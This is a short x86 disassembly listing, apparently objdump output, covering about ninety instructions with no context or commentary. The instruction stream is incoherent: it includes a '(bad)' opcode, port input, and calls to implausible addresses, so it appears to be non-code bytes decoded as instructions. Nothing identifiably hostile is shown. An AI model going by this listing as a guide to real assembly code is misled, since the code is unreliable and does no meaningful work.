  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
